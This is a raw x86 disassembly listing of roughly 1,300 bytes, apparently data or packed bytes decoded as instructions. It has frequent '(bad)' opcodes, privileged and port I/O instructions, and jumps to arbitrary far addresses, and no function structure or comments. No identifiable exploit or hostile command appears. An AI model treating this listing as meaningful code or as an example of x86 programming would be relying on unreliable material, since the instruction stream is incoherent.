  41f92b:	push   cs
  41f92c:	cwde   
  41f92d:	inc    eax
  41f92e:	cmc    
  41f92f:	lahf   
  41f930:	xchg   ecx,eax
  41f931:	or     al,0xcd
  41f933:	mov    ch,0xf3
  41f935:	mov    ebx,0x619c943e
  41f93a:	enter  0xe6ff,0x9e
  41f93e:	dec    ebx
  41f93f:	mov    al,ds:0xf8afd3ff
  41f944:	fisttp QWORD PTR [ecx-0x3b486f9d]
  41f94a:	icebp  
  41f94b:	test   DWORD PTR [edi-0x46],ecx
  41f94e:	cmp    ch,dl
  41f950:	scas   al,BYTE PTR es:[edi]
  41f951:	je     0x41f989
  41f953:	sub    DWORD PTR [ebx-0x5b],ebx
  41f956:	loopne 0x41f991
  41f958:	pusha  
  41f959:	mov    ah,0xf2
  41f95b:	jns    0x41f9d9
  41f95d:	sbb    eax,0xa3b46c96
  41f962:	pop    ebx
  41f963:	jbe    0x41f95b
  41f965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f966:	mov    eax,0x117c0511
  41f96b:	mov    dl,0x78
  41f96d:	leave  
  41f96e:	push   esp
  41f96f:	icebp  
  41f970:	pop    eax
  41f971:	les    ebp,FWORD PTR [edi]
  41f973:	stos   BYTE PTR es:[edi],al
  41f974:	mov    al,ds:0x8bbcd091
  41f979:	mov    al,BYTE PTR [esi]
  41f97b:	add    BYTE PTR [edi+0x681acf61],ah
  41f981:	scas   al,BYTE PTR es:[edi]
  41f982:	popf   
  41f983:	lods   eax,DWORD PTR ds:[esi]
  41f984:	sbb    ah,ah
  41f986:	push   ebx
  41f987:	pop    edi
  41f988:	hlt    
  41f989:	jge    0x41f991
  41f98b:	sahf   
  41f98c:	dec    edx
  41f98d:	mov    ah,0x32
  41f98f:	mov    eax,ds:0xa389c172
  41f994:	sub    eax,0xaeb7c7fc
  41f999:	ret    0x438f
  41f99c:	mov    eax,ds:0x4e92789e
  41f9a1:	xor    al,0x11
  41f9a3:	pusha  
  41f9a4:	jnp    0x41f97e
  41f9a6:	sub    eax,0xda34956e
  41f9ab:	cmp    ah,al
  41f9ad:	int    0xa2
  41f9af:	dec    eax
  41f9b0:	arpl   WORD PTR [eax+esi*4+0x48],di
  41f9b4:	pop    ds
  41f9b5:	xor    esi,DWORD PTR [edi-0xdf39b2f]
  41f9bb:	mov    al,0x60
  41f9bd:	hlt    
  41f9be:	mov    cl,0x8b
  41f9c0:	inc    esi
  41f9c1:	add    BYTE PTR [ecx-0xcf61697],dl
  41f9c7:	jae    0x41f976
  41f9c9:	(bad)  
  41f9ca:	call   0x1f81b94b
  41f9cf:	xor    eax,0x935c5de3
  41f9d4:	jge    0x41f961
  41f9d6:	mov    ecx,0x93595c45
  41f9db:	xchg   edx,eax
  41f9dc:	stc    
  41f9dd:	sahf   
  41f9de:	(bad)  
  41f9e0:	scas   eax,DWORD PTR es:[edi]
  41f9e1:	lea    ebp,[ebp-0x5c]
  41f9e4:	in     eax,dx
  41f9e5:	jnp    0x41f984
  41f9e7:	aad    0x85
  41f9e9:	pcmpeqb mm1,mm7
  41f9ec:	mov    edi,0x42b29343
  41f9f1:	mov    dl,0x36
  41f9f3:	push   ss
  41f9f4:	fisttp DWORD PTR [ebx+edi*1]
  41f9f7:	mov    DWORD PTR [eax+0x7e],esp
  41f9fa:	rol    DWORD PTR [eax+eax*2-0x5e42e298],0x6e
  41fa02:	mov    cl,0xbb
  41fa04:	mov    ds:0x84e86892,al
  41fa09:	jge    0x41fa15
  41fa0b:	mov    esp,0x6ce0cce2
  41fa10:	and    ebp,DWORD PTR [eax+0x41]
  41fa13:	inc    edx
  41fa14:	pusha  
  41fa15:	sbb    DWORD PTR [edx],ebp
  41fa17:	(bad)  
  41fa18:	je     0x41fa38
  41fa1a:	xor    BYTE PTR [ebp+0x1a68ae0b],0x59
  41fa21:	push   ds
  41fa22:	dec    esi
  41fa23:	pusha  
  41fa24:	fidivr WORD PTR [eax-0x25da0b14]
  41fa2a:	inc    ebp
  41fa2b:	fldl2t 
  41fa2d:	rcr    DWORD PTR [edx-0x6d4b2c88],1
  41fa33:	repnz fucomip st,st(5)
  41fa36:	out    dx,al
  41fa37:	ins    BYTE PTR es:[edi],dx
  41fa38:	dec    esi
  41fa39:	cli    
  41fa3a:	hlt    
  41fa3b:	les    ecx,FWORD PTR [ecx]
  41fa3d:	retf   
  41fa3e:	sti    
  41fa3f:	out    dx,al
  41fa40:	test   DWORD PTR [edi],0xa47229d
  41fa46:	dec    esi
  41fa47:	nop
  41fa48:	sbb    al,0x6b
  41fa4a:	or     BYTE PTR [edx+0x46],cl
  41fa4d:	add    DWORD PTR [esi+0x4dd4b08e],edx
  41fa53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa54:	inc    eax
  41fa55:	push   ebp
  41fa56:	lock cwde 
  41fa58:	adc    edx,ebx
  41fa5a:	shl    cl,1
  41fa5c:	hlt    
  41fa5d:	ret    0x1c7b
  41fa60:	stos   BYTE PTR es:[edi],al
  41fa61:	mov    ecx,0xbf4b84e8
  41fa66:	mov    es,WORD PTR [edi+ebx*4-0x80]
  41fa6a:	lahf   
  41fa6b:	outs   dx,DWORD PTR ds:[esi]
  41fa6c:	scas   eax,DWORD PTR es:[edi]
  41fa6d:	mov    al,ds:0xdd566fb5
  41fa72:	(bad)  
  41fa73:	mov    dl,0x6
  41fa75:	(bad)  
  41fa76:	fs ins DWORD PTR es:[edi],dx
  41fa78:	mov    cs,WORD PTR [edi]
  41fa7a:	jb     0x41faf0
  41fa7c:	push   0xffffffe2
  41fa7e:	xlat   BYTE PTR ds:[ebx]
  41fa7f:	jae    0xc5ae3fee
  41fa85:	jp     0x41fa2a
  41fa87:	popa   
  41fa88:	loopne 0x41faa1
  41fa8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa8b:	pusha  
  41fa8c:	lods   eax,DWORD PTR ds:[esi]
  41fa8d:	jg     0x41fab6
  41fa8f:	ins    BYTE PTR es:[edi],dx
  41fa90:	pop    esi
  41fa91:	stos   DWORD PTR es:[edi],eax
  41fa92:	dec    esi
  41fa93:	out    0xc9,eax
  41fa95:	sbb    BYTE PTR [ecx-0x18],0x9f
  41fa99:	xchg   esp,eax
  41fa9a:	xchg   ebx,eax
  41fa9b:	mov    ebx,0x98e213fb
  41faa0:	jp     0x41fa4f
  41faa2:	dec    ebx
  41faa3:	mov    al,ah
  41faa5:	cdq    
  41faa6:	jecxz  0x41fb26
  41faa8:	inc    esp
  41faa9:	dec    eax
  41faaa:	lea    edx,[ebx+eax*4-0x17]
  41faae:	aam    0x42
  41fab0:	adc    al,0x70
  41fab2:	js     0x41fb0e
  41fab4:	pusha  
  41fab5:	lds    esp,FWORD PTR [edx+0x70bb9299]
  41fabb:	fadd   QWORD PTR [ebx-0x2a]
  41fabe:	lock mov edx,0xf0188e45
  41fac4:	pop    ebx
  41fac5:	in     eax,0x62
  41fac7:	sub    DWORD PTR [ecx-0x2eb33496],0xffffff9f
  41face:	mov    dh,0x56
  41fad0:	mov    cl,BYTE PTR [ecx]
  41fad2:	dec    esp
  41fad3:	push   esp
  41fad4:	add    DWORD PTR [edx+0x22],ebp
  41fad7:	pop    edi
  41fad8:	rol    BYTE PTR [eax],1
  41fada:	dec    esi
  41fadb:	mov    edi,0xc8408b95
  41fae0:	cmc    
  41fae1:	sub    dl,BYTE PTR [ecx]
  41fae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae4:	jmp    0x50c7:0xa7856266
  41faeb:	jno    0x41fac9
  41faed:	int    0xac
  41faef:	jg     0x41fa71
  41faf1:	test   BYTE PTR [esi-0x53366ed8],cl
  41faf7:	fdivr  QWORD PTR [edx-0x7d]
  41fafa:	sub    ecx,DWORD PTR [ebp+0x29]
  41fafd:	adc    DWORD PTR [esp+esi*4+0x41],ebp
  41fb01:	rol    BYTE PTR [eax+0x40],cl
  41fb04:	mov    ch,0x6
  41fb06:	push   esi
  41fb07:	or     eax,0xac624af3
  41fb0c:	and    eax,0xb1d96f79
  41fb11:	dec    esp
  41fb12:	imul   eax,DWORD PTR [ebx],0xe67d32b1
  41fb18:	icebp  
  41fb19:	stos   BYTE PTR es:[edi],al
  41fb1a:	shr    BYTE PTR [ebx],0x52
  41fb1d:	pop    es
  41fb1e:	(bad)  
  41fb1f:	mov    BYTE PTR [eax+0x14429028],bl
  41fb25:	(bad)  
  41fb26:	outs   dx,BYTE PTR ds:[esi]
  41fb27:	sub    ah,BYTE PTR ds:0x6eedb849
  41fb2d:	pop    ecx
  41fb2e:	sbb    BYTE PTR [ebp-0x7c],0xc0
  41fb32:	js     0x41fadd
  41fb34:	sub    bh,al
  41fb36:	mov    ds:0xbfaed897,eax
  41fb3b:	inc    ebx
  41fb3c:	addr16 sbb ebp,ebx
  41fb3f:	sbb    dh,ch
  41fb41:	or     DWORD PTR [edx],esi
  41fb43:	sar    BYTE PTR [edi+0x360f460c],0x94
  41fb4a:	(bad)  
  41fb4b:	sub    BYTE PTR [edx],dh
  41fb4d:	and    esp,edx
  41fb4f:	sbb    dh,al
  41fb51:	(bad)  
  41fb52:	dec    ebx
  41fb53:	scas   eax,DWORD PTR es:[edi]
  41fb54:	cld    
  41fb55:	pop    ecx
  41fb56:	cmp    ch,BYTE PTR [ebx+0x2c]
  41fb59:	dec    WORD PTR [esi+ebx*8+0xf]
  41fb5e:	es and al,0x8a
  41fb61:	lods   al,BYTE PTR ds:[esi]
  41fb62:	push   ebx
  41fb63:	pop    ebx
  41fb64:	pushf  
  41fb65:	push   edx
  41fb66:	std    
  41fb67:	sub    ebx,ebp
  41fb69:	mov    ecx,0x4cc5d90f
  41fb6e:	jp     0x41fb2c
  41fb70:	mov    ds:0xf18426f0,eax
  41fb75:	fnstenv [ecx]
  41fb77:	cmp    al,0xa1
  41fb79:	mov    dh,0x53
  41fb7b:	jne    0x41fbc9
  41fb7d:	call   0x73fe:0x42f31a47
  41fb84:	mov    ebx,0xa738582e
  41fb89:	lahf   
  41fb8a:	or     edi,DWORD PTR [edx*4+0x61b6dc66]
  41fb91:	sub    eax,DWORD PTR [edi+ebp*1-0x15]
  41fb95:	ins    DWORD PTR es:[edi],dx
  41fb96:	in     al,0x3e
  41fb98:	and    bh,bl
  41fb9a:	repnz xchg ecx,eax
  41fb9c:	loop   0x41fbda
  41fb9e:	mov    bh,0xe4
  41fba0:	mov    ss,WORD PTR [esi-0x25]
  41fba3:	ins    DWORD PTR es:[edi],dx
  41fba4:	xchg   esi,eax
  41fba5:	xor    BYTE PTR [ebx-0xe55ada],ah
  41fbab:	mov    edx,0x7e695ca0
  41fbb0:	adc    cl,BYTE PTR [ebp-0x49]
  41fbb3:	cmp    dl,BYTE PTR [edi]
  41fbb5:	gs (bad) 
  41fbb7:	jmp    0xe9cc:0x37f5815c
  41fbbe:	mov    ds,WORD PTR ds:0x1565db6f
  41fbc4:	mov    edx,0xfe856d13
  41fbc9:	cmp    BYTE PTR [esi+0x646d397a],dl
  41fbcf:	stc    
  41fbd0:	pop    edi
  41fbd1:	mov    bh,0x85
  41fbd3:	mov    al,ds:0x847672fb
  41fbd8:	sub    ch,BYTE PTR [edi+0x1c]
  41fbdb:	fbstp  TBYTE PTR [eax]
  41fbdd:	cmp    edx,DWORD PTR [ebx]
  41fbdf:	mov    ss,WORD PTR [edi-0x4a2d5501]
  41fbe5:	(bad)  
  41fbe7:	shl    BYTE PTR ds:0x9b09ea3f,1
  41fbed:	cdq    
  41fbee:	lods   eax,DWORD PTR ds:[esi]
  41fbef:	wrmsr  
  41fbf1:	xor    DWORD PTR [edi+0x2],ebp
  41fbf4:	stos   BYTE PTR es:[edi],al
  41fbf5:	xchg   ecx,eax
  41fbf6:	(bad)  
  41fbf7:	sub    BYTE PTR ds:0xf5d76895,bl
  41fbfd:	inc    eax
  41fbfe:	xlat   BYTE PTR ds:[ebx]
  41fbff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc00:	scas   eax,DWORD PTR es:[edi]
  41fc01:	sbb    BYTE PTR [edx+eiz*4],cl
  41fc04:	inc    edi
  41fc05:	or     ebp,esi
  41fc07:	daa    
  41fc08:	in     al,dx
  41fc09:	stos   DWORD PTR es:[edi],eax
  41fc0a:	retf   0x9efe
  41fc0d:	leave  
  41fc0e:	iret   
  41fc0f:	inc    edx
  41fc10:	dec    edi
  41fc11:	push   esi
  41fc12:	imul   DWORD PTR [edx]
  41fc14:	xchg   DWORD PTR [edx+0x55397efd],ebp
  41fc1a:	fimul  WORD PTR [ebx+0x69]
  41fc1d:	sbb    ecx,ebx
  41fc1f:	push   edx
  41fc20:	repz push es
  41fc22:	cmp    eax,DWORD PTR [ebx+ebp*1-0x22e42734]
  41fc29:	int3   
  41fc2a:	push   cs
  41fc2b:	inc    ebx
  41fc2c:	mov    bl,0x5f
  41fc2e:	push   esi
  41fc2f:	in     eax,dx
  41fc30:	data16 (bad) 
  41fc32:	cmp    DWORD PTR [edx-0x27a6fd05],esi
  41fc38:	sbb    DWORD PTR [esi-0x66],esi
  41fc3b:	test   BYTE PTR [eax+0x3580efdd],cl
  41fc41:	lahf   
  41fc42:	pop    edi
  41fc43:	leave  
  41fc44:	xchg   esi,eax
  41fc45:	push   edi
  41fc46:	aaa    
  41fc47:	lds    ebx,FWORD PTR [esi+0xd8420fc]
  41fc4d:	or     BYTE PTR [edi],ah
  41fc4f:	inc    ecx
  41fc50:	and    al,0xd5
  41fc52:	fisubr DWORD PTR [ebx-0x7d]
  41fc55:	aam    0xd6
  41fc57:	push   0xbc0c770b
  41fc5c:	lods   eax,DWORD PTR ds:[esi]
  41fc5d:	mov    al,0xf
  41fc5f:	xchg   esi,eax
  41fc60:	fwait
  41fc61:	out    dx,eax
  41fc62:	fnsave [edi]
  41fc64:	pop    ecx
  41fc65:	(bad)  
  41fc66:	dec    ebx
  41fc67:	push   ecx
  41fc68:	ins    DWORD PTR es:[edi],dx
  41fc69:	mov    eax,0xbd0909ad
  41fc6e:	call   0x31f7:0x5023f490
  41fc75:	lock push ebx
  41fc77:	sti    
  41fc78:	nop
  41fc79:	xchg   esp,eax
  41fc7a:	xor    al,0xe8
  41fc7c:	fnstsw WORD PTR [esi+0x58]
  41fc7f:	repnz and edi,DWORD PTR [esi+0x155accb2]
  41fc86:	add    BYTE PTR [eax+0x3ab69184],al
  41fc8c:	inc    eax
  41fc8d:	push   esp
  41fc8e:	push   esi
  41fc8f:	cmp    BYTE PTR [esi+0x61],bl
  41fc92:	lds    ebp,FWORD PTR [ebp-0x42]
  41fc95:	retf   
  41fc96:	xchg   esp,eax
  41fc97:	nop
  41fc98:	leave  
  41fc99:	cmp    al,BYTE PTR [ebx-0xa69f186]
  41fc9f:	dec    ebx
  41fca0:	jl     0x41fc81
  41fca2:	adc    esi,ebx
  41fca4:	dec    ebp
  41fca5:	das    
  41fca6:	jmp    0xbdf16687
  41fcab:	sub    eax,0x95aea6d6
  41fcb0:	loopne 0x41fc82
  41fcb2:	mov    eax,ds:0xc3e8a335
  41fcb7:	lea    edi,[eax+0x276d4a45]
  41fcbd:	lahf   
  41fcbe:	(bad)  
  41fcbf:	loopne 0x41fccb
  41fcc1:	inc    ebp
  41fcc2:	aas    
  41fcc3:	and    cl,al
  41fcc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcc6:	and    ecx,DWORD PTR [edx-0x77cd76b9]
  41fccc:	test   eax,0xd8f7647c
  41fcd1:	and    ebp,DWORD PTR [edi-0x3e]
  41fcd4:	fcomp  QWORD PTR [edi]
  41fcd6:	xlat   BYTE PTR ds:[ebx]
  41fcd7:	loope  0x41fd26
  41fcd9:	fstp   st(4)
  41fcdb:	xchg   ecx,eax
  41fcdc:	sbb    edx,ebx
  41fcde:	and    BYTE PTR [edi+eiz*8-0x69],ch
  41fce2:	xor    eax,0xa620de1c
  41fce7:	cmp    cl,bl
  41fce9:	lahf   
  41fcea:	inc    ebp
  41fceb:	lods   al,BYTE PTR ds:[esi]
  41fcec:	fnsave [ecx-0x71]
  41fcef:	pop    eax
  41fcf0:	aam    0xe5
  41fcf2:	or     DWORD PTR [edi-0x6d],esi
  41fcf5:	data16 int3 
  41fcf7:	loope  0x41fc94
  41fcf9:	cmc    
  41fcfa:	add    BYTE PTR [esi],bh
  41fcfc:	mov    esi,0x6f4edac2
  41fd01:	xor    ebx,DWORD PTR [ecx]
  41fd03:	dec    ebx
  41fd04:	(bad)  
  41fd06:	pop    ecx
  41fd07:	xchg   DWORD PTR [ebx+0x2cf2377c],ecx
  41fd0d:	js     0x41fcd9
  41fd0f:	inc    ebx
  41fd10:	imul   dl
  41fd12:	cmp    edx,DWORD PTR [eax+edx*1+0x26]
  41fd16:	in     eax,0xfb
  41fd18:	shl    BYTE PTR [eax+ebx*4-0x3d],1
  41fd1c:	cdq    
  41fd1d:	lods   eax,DWORD PTR ds:[esi]
  41fd1e:	and    edi,DWORD PTR [edi+0x2c45ff31]
  41fd24:	int    0x4e
  41fd26:	add    al,0xfe
  41fd28:	lock leave 
  41fd2a:	gs push eax
  41fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2d:	aad    0x19
  41fd2f:	push   cs
  41fd30:	dec    ebx
  41fd31:	jns    0x41fda5
  41fd33:	(bad)  
  41fd34:	cmp    DWORD PTR [ebx-0x5127579d],eax
  41fd3a:	add    ah,al
  41fd3c:	inc    esp
  41fd3d:	in     al,0xe4
  41fd3f:	in     al,dx
  41fd40:	or     al,0x64
  41fd42:	add    eax,DWORD PTR [edx+0x7]
  41fd45:	dec    edx
  41fd46:	retf   
  41fd47:	andps  xmm7,XMMWORD PTR [ebp+0x691a21fe]
  41fd4e:	push   esp
  41fd4f:	cs push esi
  41fd51:	into   
  41fd52:	jno    0x41fd76
  41fd54:	pop    esi
  41fd55:	loope  0x41fd0e
  41fd57:	imul   esp,DWORD PTR [ecx+0x33],0xc4712a47
  41fd5e:	std    
  41fd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd60:	les    eax,FWORD PTR [ebp-0x7b]
  41fd63:	dec    esi
  41fd64:	mov    bl,0xe2
  41fd66:	daa    
  41fd67:	rcl    BYTE PTR [ecx],0x9
  41fd6a:	scas   eax,DWORD PTR es:[edi]
  41fd6b:	mov    ?,WORD PTR [eax-0x40727f9b]
  41fd71:	fwait
  41fd72:	push   cs
  41fd73:	fs loopne 0x41fdf4
  41fd76:	in     eax,0xa0
  41fd78:	ins    DWORD PTR es:[edi],dx
  41fd79:	fs mov edx,0x1d023e04
  41fd7f:	inc    ecx
  41fd80:	pop    edi
  41fd81:	dec    eax
  41fd82:	adc    ebp,edx
  41fd84:	jae    0x41fd34
  41fd86:	call   FWORD PTR [esi+0x37]
  41fd89:	neg    BYTE PTR [edi-0x70]
  41fd8c:	popa   
  41fd8d:	push   edi
  41fd8e:	or     al,0xaf
  41fd90:	sbb    ah,cl
  41fd92:	sub    eax,0x169ce71a
  41fd97:	es cdq 
  41fd99:	loop   0x41fd3d
  41fd9b:	inc    edi
  41fd9c:	popf   
  41fd9d:	cmp    ah,BYTE PTR ss:[esi-0x30e68029]
  41fda4:	je     0x41fdd9
  41fda6:	test   edx,ebp
  41fda8:	mov    al,ds:0xc5201909
  41fdad:	pop    ebx
  41fdae:	cmc    
  41fdaf:	sbb    BYTE PTR [edx+0x20529e4d],al
  41fdb5:	adc    DWORD PTR [ebp+0x6cc1c546],esp
  41fdbb:	pusha  
  41fdbc:	xchg   DWORD PTR [edx+0x22],edi
  41fdbf:	(bad)  
  41fdc0:	(bad)  
  41fdc1:	pushw  cs
  41fdc3:	jge    0x41fdc3
  41fdc5:	ret    
  41fdc6:	mov    ch,0xfd
  41fdc8:	adc    eax,0x88afd1c4
  41fdcd:	pop    ebx
  41fdce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdcf:	pop    edx
  41fdd0:	outs   dx,DWORD PTR ds:[esi]
  41fdd1:	push   esi
  41fdd2:	inc    ecx
  41fdd3:	retf   0x37b
  41fdd6:	cmp    eax,0x52ca14b1
  41fddb:	loop   0x41fda8
  41fddd:	popf   
  41fdde:	fs retf 
  41fde0:	daa    
  41fde1:	das    
  41fde2:	cli    
  41fde3:	inc    ebx
  41fde4:	fs scas al,BYTE PTR es:[edi]
  41fde6:	jo     0x41fd85
  41fde8:	lods   eax,DWORD PTR ds:[esi]
  41fde9:	gs dec esi
  41fdeb:	inc    ebx
  41fdec:	sbb    esp,DWORD PTR [ebp+0x40]
  41fdef:	ds jb  0x41fde6
  41fdf2:	inc    esi
  41fdf3:	xlat   BYTE PTR ds:[ebx]
  41fdf4:	ficomp DWORD PTR [ebx-0x7b]
  41fdf8:	or     al,0x20
  41fdfa:	(bad)  
  41fdfc:	jne    0x41fdd2
  41fdfe:	arpl   WORD PTR [eax],si
  41fe00:	daa    
  41fe01:	ins    BYTE PTR es:[edi],dx
  41fe02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe03:	in     al,dx
  41fe04:	add    ebx,ebx
  41fe06:	jmp    0xef37:0x6615b08a
  41fe0d:	adc    BYTE PTR [ecx+0x51],dh
  41fe10:	outs   dx,DWORD PTR ds:[esi]
  41fe11:	cli    
  41fe12:	inc    ebp
  41fe13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe14:	mov    esi,ecx
  41fe16:	push   0xd79e2e46
  41fe1b:	jno    0x41fdbb
  41fe1d:	jae    0x41fe14
  41fe1f:	adc    BYTE PTR [edx*1-0x61038f51],bl
  41fe26:	mov    esp,0x8a27ec4e
  41fe2b:	std    
  41fe2c:	mov    ds:0x6a3656f2,al
  41fe31:	clc    
  41fe32:	mov    ch,0x47
  41fe34:	pop    ss
  41fe35:	mov    ebp,0x3e6cef77
  41fe3a:	and    eax,0xbb1170e3
  41fe3f:	add    esi,DWORD PTR [ecx-0x33]
  41fe42:	loope  0x41fdc9
  41fe44:	ins    DWORD PTR es:[edi],dx
  41fe45:	into   
  41fe46:	mov    bl,0x8d
  41fe48:	mov    bh,0x2
  41fe4a:	sub    al,0xc8
  41fe4c:	jmp    0x3da:0x5f89790e
  41fe53:	mov    esp,DWORD PTR [ebp+0x75]
  41fe56:	push   ecx
  41fe57:	push   es
  41fe58:	xchg   ecx,eax
  41fe59:	sar    DWORD PTR [edi],1
  41fe5b:	cs aad 0x60
  41fe5e:	cmp    edx,DWORD PTR [eax-0x59eee070]
  41fe64:	test   eax,0x44ee8816
  41fe69:	push   esi
  41fe6a:	test   al,0x68
  41fe6c:	push   ecx
  41fe6d:	sub    ebp,esi
  41fe6f:	mov    fs,WORD PTR [eax+0x7010e23f]
  41fe75:	mov    al,ds:0x51ccb839
  41fe7a:	jb     0x41fe83
  41fe7c:	fs jne 0x41fe80
  41fe7f:	mov    ebx,0x4e95c601
  41fe84:	xchg   ecx,eax
  41fe85:	ss iret 
  41fe87:	icebp  
  41fe88:	lods   eax,DWORD PTR ds:[esi]
  41fe89:	inc    ebx
  41fe8a:	test   DWORD PTR [esi+0x74],ecx
  41fe8d:	push   esi
  41fe8e:	out    dx,eax
  41fe8f:	push   edi
  41fe90:	push   es
  41fe91:	jns    0x41febe
  41fe93:	jne    0x41feb8
  41fe95:	cs inc esi
  41fe97:	pop    ss
  41fe98:	xor    BYTE PTR [ecx-0x381077b9],dh
  41fe9e:	jmp    0x41fe39
  41fea0:	inc    ecx
  41fea1:	clc    
  41fea2:	inc    eax
  41fea3:	inc    edi
  41fea4:	call   0xfca82e2e
  41fea9:	in     eax,0xcf
  41feab:	ss mov al,ch
  41feae:	and    DWORD PTR [edi-0x3b95e29a],0xaa0d28f0
  41feb8:	mov    cl,0x30
  41feba:	mov    dl,0x9
  41febc:	lea    ebx,[ebx]
  41febe:	ja     0x41fe53
  41fec0:	cmp    DWORD PTR [edx+esi*8+0x56],ecx
  41fec4:	clc    
  41fec5:	mov    ecx,0x1fa4a875
  41feca:	xchg   esi,eax
  41fecb:	jl     0x41fe6b
  41fecd:	fbld   TBYTE PTR [edx]
  41fecf:	jno    0x41fecd
  41fed1:	mov    eax,0xa4574cc2
  41fed6:	push   ecx
  41fed7:	fst    QWORD PTR [esi+0x34]
  41feda:	rol    DWORD PTR [edx-0x21e52e59],0xda
  41fee1:	popa   
  41fee2:	mov    al,BYTE PTR [esi-0xd71e422]
  41fee8:	jle    0x41ff2a
  41feea:	add    ah,0x90
  41feed:	rcl    BYTE PTR [edx],cl
  41feef:	out    0xb,eax
  41fef1:	das    
  41fef2:	js     0x41ff0a
  41fef4:	or     al,bh
  41fef6:	inc    edi
  41fef7:	jecxz  0x41ff2d
  41fef9:	test   DWORD PTR [edi],0xfff4b5b1
  41feff:	adc    eax,0xd8bf618f
  41ff04:	mov    dl,0x7c
  41ff06:	mov    esp,DWORD PTR [ecx-0x1c74e00a]
  41ff0c:	sbb    al,0x63
  41ff0e:	icebp  
  41ff0f:	fs mov ebp,0xb171dda2
  41ff15:	and    ebx,DWORD PTR [ebx]
  41ff17:	(bad)  
  41ff18:	add    ebp,DWORD PTR [ebx-0x19b87ba]
  41ff1e:	ins    DWORD PTR es:[edi],dx
  41ff1f:	cld    
  41ff20:	xlat   BYTE PTR ds:[ebx]
  41ff21:	arpl   WORD PTR [eax+ecx*4+0x34],dx
  41ff25:	out    dx,al
  41ff26:	aaa    
  41ff27:	lods   al,BYTE PTR ds:[esi]
  41ff28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff29:	stos   BYTE PTR es:[edi],al
  41ff2a:	popf   
  41ff2b:	popa   
  41ff2c:	aas    
  41ff2d:	popf   
  41ff2e:	dec    ebx
  41ff2f:	cs pop esp
  41ff31:	dec    esp
  41ff32:	inc    ecx
  41ff33:	stos   DWORD PTR es:[edi],eax
  41ff34:	into   
  41ff35:	sub    esi,ebp
  41ff37:	fdivr  st(2),st
  41ff39:	pushf  
  41ff3a:	mov    eax,ds:0xf7f1e7d1
  41ff3f:	push   0x1
  41ff41:	xor    BYTE PTR [edi-0x1c02fd5a],0x92
  41ff48:	in     al,dx
  41ff49:	in     al,0xfb
  41ff4b:	mov    edx,0x224adace
  41ff50:	out    dx,al
  41ff51:	dec    ecx
  41ff52:	sub    edi,DWORD PTR [ebx+0x18]
  41ff55:	ret    
  41ff56:	inc    ebx
  41ff57:	outs   dx,DWORD PTR ds:[esi]
  41ff58:	mov    ecx,0xe2158f59
  41ff5d:	sbb    al,BYTE PTR [esp+ebp*4]
  41ff60:	pop    ebp
  41ff61:	lahf   
  41ff62:	cmp    ebx,0xe55290de
  41ff68:	mov    ebp,DWORD PTR [ebx+0x45]
  41ff6b:	fld    QWORD PTR [ebp-0x7f]
  41ff6e:	iret   
  41ff6f:	stc    
  41ff70:	push   eax
  41ff71:	xchg   ebp,eax
  41ff72:	jmp    0x2a7b3bf4
  41ff77:	aaa    
  41ff78:	xlat   BYTE PTR ds:[ebx]
  41ff79:	sbb    DWORD PTR [edi+0x54],eax
  41ff7c:	int    0x5a
  41ff7e:	sub    bh,bh
  41ff80:	ins    DWORD PTR es:[edi],dx
  41ff81:	(bad)  
  41ff83:	jmp    0x41ffc4
  41ff85:	cmp    eax,0x21222bf7
  41ff8a:	xchg   DWORD PTR [ecx+0x73b0ef62],edx
  41ff90:	idiv   BYTE PTR [edi]
  41ff92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff93:	ud1    esp,DWORD PTR [esi]
  41ff96:	inc    eax
  41ff97:	mov    ebx,0xa59303a7
  41ff9c:	int    0xfc
  41ff9e:	add    al,0xc4
  41ffa0:	jl     0x41ffc9
  41ffa2:	cmp    dl,BYTE PTR [esi]
  41ffa4:	pop    edi
  41ffa5:	fs (bad) 
  41ffa7:	pushf  
  41ffa8:	lods   eax,DWORD PTR ds:[esi]
  41ffa9:	sbb    eax,0x550a8aac
  41ffae:	div    BYTE PTR [edi+0x3a068142]
  41ffb4:	xor    eax,0xa595ca9c
  41ffb9:	iret   
  41ffba:	xchg   DWORD PTR [ebx+ebp*2+0x5],edi
  41ffbe:	xor    al,0x64
  41ffc0:	lds    eax,FWORD PTR [ecx+0x16]
  41ffc3:	outs   dx,DWORD PTR ds:[esi]
  41ffc4:	sbb    BYTE PTR [ecx-0x31],bh
  41ffc7:	and    BYTE PTR [esi+ecx*2-0x5f],0xd0
  41ffcc:	jb     0x41fffb
  41ffce:	push   ebx
  41ffcf:	es lock jecxz 0x42003e
  41ffd3:	mov    cl,0x91
  41ffd5:	sub    BYTE PTR [ebp*4+0x7a38c277],dh
  41ffdc:	(bad)  
  41ffdd:	fidivr WORD PTR [ecx+0x1d]
  41ffe0:	mov    bh,0xfe
  41ffe2:	aam    0xb6
  41ffe4:	pushf  
  41ffe5:	inc    BYTE PTR [edx-0x74]
  41ffe8:	(bad)  
  41ffe9:	out    0xa5,al
  41ffeb:	daa    
  41ffec:	inc    eax
  41ffed:	ja     0x420028
  41ffef:	pop    esi
  41fff0:	(bad)  
  41fff1:	jl     0x41ffda
  41fff3:	mov    al,0x9e
  41fff5:	clc    
  41fff6:	sub    ah,dl
  41fff8:	in     eax,0xbd
  41fffa:	js     0x42000a
  41fffc:	add    dl,BYTE PTR [esi]
  41fffe:	ins    DWORD PTR es:[edi],dx
  41ffff:	jne    0x41ffab
  420001:	inc    esi
  420002:	mov    edi,0xe213e921
  420007:	xor    BYTE PTR [ebx+0x15],dl
  42000a:	sub    esp,eax
  42000c:	push   ds
  42000d:	sbb    bh,BYTE PTR [edi]
  42000f:	aad    0xd
  420011:	outs   dx,BYTE PTR ds:[esi]
  420012:	jnp    0x41ff97
  420014:	mov    edx,0xbaac5fdf
  420019:	xor    ebp,ebp
